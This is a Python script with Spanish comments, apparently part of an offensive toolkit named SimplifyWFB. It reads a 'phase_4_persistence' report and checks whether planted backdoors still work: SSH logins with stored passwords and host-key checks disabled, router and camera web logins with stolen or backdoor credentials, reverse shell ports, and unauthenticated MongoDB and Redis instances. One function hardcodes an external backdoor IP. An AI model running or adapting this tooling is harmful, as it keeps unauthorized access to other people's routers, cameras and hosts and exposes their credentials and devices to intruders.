#!/usr/bin/env python3
"""
Script para probar la conectividad de backdoors desde un reporte SimplifyWFB
Lee el report.json y prueba todos los backdoors encontrados
"""

import json
import socket
import subprocess
import time
import sys
import os
from typing import Dict, List, Any, Optional

class BackdoorTester:
    def __init__(self, report_file: str = "report.json"):
        """Inicializar el tester de backdoors"""
        self.report_file = report_file
        self.report_data = None
        self.results = {
            'ssh_connections': [],
            'router_access': [],
            'network_services': [],
            'reverse_shells': [],
            'vulnerable_services': [],
            'camera_backdoors': [],
            'summary': {
                'total_tested': 0,
                'successful': 0,
                'failed': 0,
                'timestamp': time.time()
            }
        }
        
    def load_report(self) -> bool:
        """Cargar el reporte JSON"""
        try:
            if not os.path.exists(self.report_file):
                print(f"❌ Archivo de reporte no encontrado: {self.report_file}")
                return False
                
            with open(self.report_file, 'r', encoding='utf-8') as f:
                self.report_data = json.load(f)
                
            print(f"✅ Reporte cargado: {self.report_file}")
            return True
            
        except Exception as e:
            print(f"❌ Error cargando reporte: {e}")
            return False
    
    def test_port_open(self, host: str, port: int) -> Dict[str, Any]:
        """Probar si un puerto está abierto"""
        result = {
            'host': host,
            'port': port,
            'status': 'failed',
            'error': None,
            'timestamp': time.time()
        }
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            connection_result = sock.connect_ex((host, port))
            sock.close()
            
            if connection_result == 0:
                result['status'] = 'success'
                result['type'] = 'port_open'
            else:
                result['error'] = f"Puerto {port} no accesible en {host}"
                
        except Exception as e:
            result['error'] = f"Error probando puerto: {str(e)}"
            
        return result
    
    def test_ssh_connection(self, host: str, port: int, username: str, password: str) -> Dict[str, Any]:
        """Probar conexión SSH"""
        result = {
            'host': host,
            'port': port,
            'username': username,
            'type': 'ssh',
            'status': 'failed',
            'error': None,
            'timestamp': time.time()
        }
        
        try:
            # Probar conectividad básica
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            connection_result = sock.connect_ex((host, port))
            sock.close()
            
            if connection_result != 0:
                result['error'] = f"Puerto {port} no accesible"
                return result
            
            # Probar autenticación SSH
            ssh_cmd = [
                'ssh', '-o', 'ConnectTimeout=10',
                '-o', 'StrictHostKeyChecking=no',
                '-o', 'UserKnownHostsFile=/dev/null',
                '-o', 'LogLevel=ERROR',
                f'{username}@{host}',
                'echo "SSH_CONNECTION_SUCCESS"'
            ]
            
            process = subprocess.run(
                ssh_cmd,
                input=f'{password}\n',
                text=True,
                capture_output=True,
                timeout=5
            )
            
            if process.returncode == 0 and "SSH_CONNECTION_SUCCESS" in process.stdout:
                result['status'] = 'success'
                result['error'] = None
            else:
                result['error'] = f"Autenticación fallida: {process.stderr.strip()}"
                
        except subprocess.TimeoutExpired:
            result['error'] = "Timeout en conexión SSH"
        except Exception as e:
            result['error'] = f"Error SSH: {str(e)}"
            
        return result
    
    def test_http_connection(self, host: str, port: int, username: str, password: str, path: str = "/") -> Dict[str, Any]:
        """Probar conexión HTTP/HTTPS"""
        result = {
            'host': host,
            'port': port,
            'username': username,
            'type': 'http',
            'status': 'failed',
            'error': None,
            'timestamp': time.time()
        }
        
        try:
            import urllib.request
            import base64
            
            # Crear autenticación básica
            auth_string = f"{username}:{password}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            url = f"http://{host}:{port}{path}"
            req = urllib.request.Request(url)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            
            with urllib.request.urlopen(req, timeout=3) as response:
                if response.status == 200:
                    result['status'] = 'success'
                else:
                    result['error'] = f"HTTP {response.status}: {response.reason}"
                    
        except urllib.error.HTTPError as e:
            if e.code == 401:
                result['error'] = "Credenciales incorrectas"
            else:
                result['error'] = f"HTTP Error {e.code}: {e.reason}"
        except Exception as e:
            result['error'] = f"Error HTTP: {str(e)}"
            
        return result
    
    def test_router_access(self, router: Dict[str, Any]) -> Dict[str, Any]:
        """Probar acceso al router"""
        result = {
            'gateway': router['gateway'],
            'router_type': router['router_type'],
            'credentials': router['credentials'],
            'status': 'failed',
            'error': None,
            'timestamp': time.time()
        }
        
        try:
            # Probar acceso web del router
            http_result = self.test_http_connection(
                router['gateway'], 
                80, 
                router['credentials']['username'], 
                router['credentials']['password']
            )
            
            if http_result['status'] == 'success':
                result['status'] = 'success'
                result['access_method'] = 'web_interface'
            else:
                result['error'] = http_result['error']
                
        except Exception as e:
            result['error'] = f"Error probando router: {str(e)}"
            
        return result
    
    def test_network_service(self, service: Dict[str, Any]) -> Dict[str, Any]:
        """Probar servicio de red persistente"""
        result = {
            'service': service['service'],
            'port': service['port'],
            'enabled': service.get('enabled', True),
            'users': service.get('users', []),
            'status': 'failed',
            'error': None,
            'timestamp': time.time()
        }
        
        if not service.get('enabled', True):
            result['error'] = "Servicio deshabilitado"
            return result
            
        try:
            # Para backdoors externos, usar la IP externa del reporte
            host = "212.95.62.135"  # IP externa de los backdoors
            
            # Obtener credenciales si existen
            username = None
            password = None
            
            if 'users' in service and service['users']:
                user = service['users'][0]
                username = user['username']
                password = user['password']
            elif 'credentials' in service:
                username = service['credentials']['username']
                password = service['credentials']['password']
            
            if service['service'] == 'ssh':
                if username and password:
                    ssh_result = self.test_ssh_connection(host, service['port'], username, password)
                    result.update(ssh_result)
                else:
                    result['error'] = "No hay credenciales SSH configuradas"
            elif service['service'] in ['http', 'web']:
                if username and password:
                    http_result = self.test_http_connection(host, service['port'], username, password)
                    result.update(http_result)
                else:
                    # Probar conectividad básica sin credenciales
                    port_result = self.test_port_open(host, service['port'])
                    result.update(port_result)
            elif service['service'] == 'openvpn':
                # Para VPN, solo verificar que el puerto esté abierto
                port_result = self.test_port_open(host, service['port'])
                result.update(port_result)
            else:
                # Probar conectividad básica para otros servicios (RDP, FTP, Telnet, VNC, SMB)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                connection_result = sock.connect_ex((host, service['port']))
                sock.close()
                
                if connection_result == 0:
                    result['status'] = 'success'
                    result['type'] = service['service']
                    result['host'] = host
                    if username and password:
                        result['credentials'] = {'username': username, 'password': password}
                else:
                    result['error'] = f"Puerto {service['port']} no accesible en {host}"
                
        except Exception as e:
            result['error'] = f"Error probando servicio: {str(e)}"
            
        return result
    
    def test_reverse_shell(self, reverse_shell: Dict[str, Any]) -> Dict[str, Any]:
        """Probar reverse shell"""
        result = {
            'port': reverse_shell['port'],
            'external_ip': reverse_shell.get('external_ip', '212.95.62.135'),
            'status': 'failed',
            'error': None,
            'timestamp': time.time()
        }
        
        try:
            # Probar conectividad al puerto del reverse shell
            port_result = self.test_port_open(reverse_shell['external_ip'], reverse_shell['port'])
            
            if port_result['status'] == 'success':
                result['status'] = 'success'
                result['type'] = 'reverse_shell'
                result['access_methods'] = reverse_shell.get('access_methods', [])
            else:
                result['error'] = port_result['error']
                
        except Exception as e:
            result['error'] = f"Error probando reverse shell: {str(e)}"
            
        return result
    
    def test_camera_backdoor(self, camera: Dict[str, Any]) -> Dict[str, Any]:
        """Probar backdoor de cámara"""
        result = {
            'host': camera['host'],
            'port': camera['port'],
            'camera_type': camera['camera_type'],
            'credentials': camera['credentials'],
            'backdoor_info': camera.get('backdoor_info', {}),
            'status': 'failed',
            'error': None,
            'timestamp': time.time()
        }
        
        try:
            # Probar credenciales originales
            original_result = self.test_http_connection(
                camera['host'],
                camera['port'],
                camera['credentials']['username'],
                camera['credentials']['password']
            )
            
            if original_result['status'] == 'success':
                result['status'] = 'success'
                result['access_method'] = 'original_credentials'
                return result
            
            # Probar credenciales de backdoor si existen
            backdoor_info = camera.get('backdoor_info', {})
            if backdoor_info and backdoor_info.get('backdoor_methods'):
                for method in backdoor_info['backdoor_methods']:
                    if method.get('status') == 'success':
                        backdoor_result = self.test_http_connection(
                            camera['host'],
                            camera['port'],
                            method['username'],
                            method['password']
                        )
                        
                        if backdoor_result['status'] == 'success':
                            result['status'] = 'success'
                            result['access_method'] = 'backdoor_credentials'
                            result['backdoor_username'] = method['username']
                            return result
            
            result['error'] = "Todas las credenciales fallaron"
            
        except Exception as e:
            result['error'] = f"Error probando cámara: {str(e)}"
            
        return result
    
    def test_vulnerable_service(self, backdoor: Dict[str, Any]) -> Dict[str, Any]:
        """Probar servicio vulnerable con backdoor"""
        result = {
            'service': backdoor['service'],
            'host': backdoor['host'],
            'port': backdoor['port'],
            'backdoor_type': backdoor['backdoor_type'],
            'credentials': backdoor.get('credentials', {}),
            'status': 'failed',
            'error': None,
            'timestamp': time.time()
        }
        
        try:
            if backdoor['service'] == 'mongodb':
                # Probar MongoDB
                import pymongo
                client = pymongo.MongoClient(f"mongodb://{backdoor['host']}:{backdoor['port']}/", serverSelectionTimeoutMS=5000)
                client.server_info()
                result['status'] = 'success'
                
            elif backdoor['service'] == 'redis':
                # Probar Redis
                import redis
                r = redis.Redis(host=backdoor['host'], port=backdoor['port'], decode_responses=True, socket_timeout=5)
                r.ping()
                result['status'] = 'success'
                
            elif backdoor['service'] in ['http', 'web']:
                # Probar HTTP
                if backdoor.get('credentials'):
                    http_result = self.test_http_connection(
                        backdoor['host'],
                        backdoor['port'],
                        backdoor['credentials']['username'],
                        backdoor['credentials']['password']
                    )
                    result.update(http_result)
                else:
                    # Probar sin autenticación
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    connection_result = sock.connect_ex((backdoor['host'], backdoor['port']))
                    sock.close()
                    
                    if connection_result == 0:
                        result['status'] = 'success'
                    else:
                        result['error'] = f"Puerto {backdoor['port']} no accesible"
            else:
                # Probar conectividad básica
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                connection_result = sock.connect_ex((backdoor['host'], backdoor['port']))
                sock.close()
                
                if connection_result == 0:
                    result['status'] = 'success'
                else:
                    result['error'] = f"Puerto {backdoor['port']} no accesible"
                    
        except ImportError as e:
            result['error'] = f"Librería requerida no instalada: {str(e)}"
        except Exception as e:
            result['error'] = f"Error probando servicio: {str(e)}"
            
        return result
    
    def run_tests(self):
        """Ejecutar todas las pruebas de backdoors"""
        if not self.report_data:
            print("❌ No hay datos de reporte cargados")
            return
            
        print("🔍 INICIANDO PRUEBAS DE BACKDOORS")
        print("=" * 60)
        
        # 1. Probar conexiones SSH remotas
        print("\n1️⃣ PROBANDO CONEXIONES SSH REMOTAS")
        remote_connections = self.report_data.get('phase_4_persistence', {}).get('remote_connections', [])
        for conn in remote_connections:
            if conn['type'] == 'ssh':
                print(f"   🔍 Probando SSH {conn['username']}@{conn['host']}:{conn['port']}")
                result = self.test_ssh_connection(
                    conn['host'], conn['port'], 
                    conn['username'], conn['password']
                )
                self.results['ssh_connections'].append(result)
                self.results['summary']['total_tested'] += 1
                
                if result['status'] == 'success':
                    print(f"   ✅ SSH exitoso: {conn['username']}@{conn['host']}")
                    self.results['summary']['successful'] += 1
                else:
                    print(f"   ❌ SSH falló: {result['error']}")
                    self.results['summary']['failed'] += 1
        
        # 2. Probar acceso al router
        print("\n2️⃣ PROBANDO ACCESO AL ROUTER")
        router_access = self.report_data.get('phase_4_persistence', {}).get('router_access', [])
        for router in router_access:
            print(f"   🔍 Probando router {router['gateway']} ({router['router_type']})")
            result = self.test_router_access(router)
            self.results['router_access'].append(result)
            self.results['summary']['total_tested'] += 1
            
            if result['status'] == 'success':
                print(f"   ✅ Router accesible: {router['gateway']}")
                self.results['summary']['successful'] += 1
            else:
                print(f"   ❌ Router inaccesible: {result['error']}")
                self.results['summary']['failed'] += 1
        
        # 3. Probar servicios de red persistentes
        print("\n3️⃣ PROBANDO SERVICIOS DE RED PERSISTENTES")
        network_persistence = self.report_data.get('phase_4_persistence', {}).get('network_persistence', [])
        for service in network_persistence:
            print(f"   🔍 Probando servicio {service['service']} puerto {service['port']}")
            result = self.test_network_service(service)
            self.results['network_services'].append(result)
            self.results['summary']['total_tested'] += 1
            
            if result['status'] == 'success':
                print(f"   ✅ Servicio activo: {service['service']}:{service['port']}")
                self.results['summary']['successful'] += 1
            else:
                print(f"   ❌ Servicio inactivo: {result['error']}")
                self.results['summary']['failed'] += 1
        
        # 4. Probar reverse shells
        print("\n4️⃣ PROBANDO REVERSE SHELLS")
        reverse_shells = [service for service in network_persistence if service.get('service') == 'reverse_shell']
        for reverse_shell in reverse_shells:
            print(f"   🔍 Probando reverse shell puerto {reverse_shell['port']}")
            result = self.test_reverse_shell(reverse_shell)
            self.results['reverse_shells'].append(result)
            self.results['summary']['total_tested'] += 1
            
            if result['status'] == 'success':
                print(f"   ✅ Reverse shell activo: puerto {reverse_shell['port']}")
                self.results['summary']['successful'] += 1
            else:
                print(f"   ❌ Reverse shell inactivo: {result['error']}")
                self.results['summary']['failed'] += 1
        
        # 5. Probar servicios vulnerables con backdoors
        print("\n5️⃣ PROBANDO SERVICIOS VULNERABLES CON BACKDOORS")
        vulnerable_backdoors = self.report_data.get('phase_4_persistence', {}).get('vulnerable_backdoors', [])
        for backdoor in vulnerable_backdoors:
            print(f"   🔍 Probando {backdoor['service']} en {backdoor['host']}:{backdoor['port']}")
            result = self.test_vulnerable_service(backdoor)
            self.results['vulnerable_services'].append(result)
            self.results['summary']['total_tested'] += 1
            
            if result['status'] == 'success':
                print(f"   ✅ Servicio vulnerable accesible: {backdoor['service']}")
                self.results['summary']['successful'] += 1
            else:
                print(f"   ❌ Servicio vulnerable inaccesible: {result['error']}")
                self.results['summary']['failed'] += 1
        
        # 5. Probar backdoors de cámaras
        print("\n5️⃣ PROBANDO BACKDOORS DE CÁMARAS")
        cameras_accessed = self.report_data.get('phase_4_persistence', {}).get('cameras_accessed', [])
        for camera in cameras_accessed:
            print(f"   🔍 Probando cámara {camera['camera_type']} en {camera['host']}:{camera['port']}")
            result = self.test_camera_backdoor(camera)
            self.results['camera_backdoors'].append(result)
            self.results['summary']['total_tested'] += 1
            
            if result['status'] == 'success':
                print(f"   ✅ Cámara accesible: {camera['camera_type']} en {camera['host']}")
                self.results['summary']['successful'] += 1
            else:
                print(f"   ❌ Cámara inaccesible: {result['error']}")
                self.results['summary']['failed'] += 1
    
    def generate_report(self) -> str:
        """Generar reporte de pruebas"""
        timestamp = int(time.time())
        report_file = f"backdoor_test_report_{timestamp}.json"
        
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        return report_file
    
    def show_summary(self):
        """Mostrar resumen de resultados"""
        print("\n" + "=" * 60)
        print("📊 RESUMEN DE PRUEBAS DE BACKDOORS")
        print("=" * 60)
        
        summary = self.results['summary']
        print(f"🔍 Total probado: {summary['total_tested']}")
        print(f"✅ Exitosos: {summary['successful']}")
        print(f"❌ Fallidos: {summary['failed']}")
        
        if summary['total_tested'] > 0:
            success_rate = (summary['successful'] / summary['total_tested']) * 100
            print(f"📈 Tasa de éxito: {success_rate:.1f}%")
        
        # Mostrar detalles por categoría
        if self.results['ssh_connections']:
            print(f"\n🔐 Conexiones SSH: {len([r for r in self.results['ssh_connections'] if r['status'] == 'success'])}/{len(self.results['ssh_connections'])} activas")
        
        if self.results['router_access']:
            print(f"🌐 Acceso a routers: {len([r for r in self.results['router_access'] if r['status'] == 'success'])}/{len(self.results['router_access'])} activos")
        
        if self.results['network_services']:
            print(f"🖥️ Servicios de red: {len([r for r in self.results['network_services'] if r['status'] == 'success'])}/{len(self.results['network_services'])} activos")
        
        if self.results['vulnerable_services']:
            print(f"🗄️ Servicios vulnerables: {len([r for r in self.results['vulnerable_services'] if r['status'] == 'success'])}/{len(self.results['vulnerable_services'])} accesibles")
        
        if self.results['camera_backdoors']:
            print(f"📹 Cámaras: {len([r for r in self.results['camera_backdoors'] if r['status'] == 'success'])}/{len(self.results['camera_backdoors'])} accesibles")

def main():
    """Función principal"""
    print("🔧 SimplifyWFB - Tester de Backdoors")
    print("=" * 50)
    
    # Verificar argumentos
    report_file = "report.json"
    if len(sys.argv) > 1:
        report_file = sys.argv[1]
    
    # Crear tester
    tester = BackdoorTester(report_file)
    
    # Cargar reporte
    if not tester.load_report():
        return
    
    # Ejecutar pruebas
    tester.run_tests()
    
    # Mostrar resumen
    tester.show_summary()
    
    # Generar reporte
    report_file = tester.generate_report()
    print(f"\n📄 Reporte de pruebas guardado: {report_file}")

if __name__ == "__main__":
    main()
